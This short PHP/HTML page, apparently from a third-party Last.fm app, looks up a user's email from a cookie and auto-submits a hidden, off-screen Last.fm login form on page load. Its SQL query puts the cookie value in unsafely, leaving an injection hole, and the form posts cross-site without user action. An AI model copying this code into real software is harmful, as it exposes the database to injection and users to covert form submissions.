<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `lastfm` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["myform"].submit();}</script>


<form method="post" action="https://www.last.fm/login" id="myform">
            <input type="hidden" name="refererKey" value="">
                        <input type="hidden" name="backto" value="http://www.last.fm/">            
            <table class="logintable">
                <tbody><tr>
                    <td style="font-size:12px;"><label for="username">Username:</label></td>
                    <td align="left" style="width:60%;"><input type="text" id="username" name="username" class="LoginBox" style="width:98%;" value="<?=$email;?>"></td>
                    <script>$("username").focus();</script>
                    <td>&nbsp;</td>
                </tr>
                <tr>
                    <td style="font-size:12px;"><label for="password">Password:</label></td>
                    <td align="left"><input type="password" id="password" name="password" value="" class="LoginBox" style="width:98%;"></td>
                    <td>&nbsp;</td>
                </tr>
                <tr>
                    <td>&nbsp;</td>
                    <td align="right" style="padding-top:1em;"><input type="submit" value="Come on in" name="login"></td>
                 
                    </form>
                    
                    

</body>
</html>

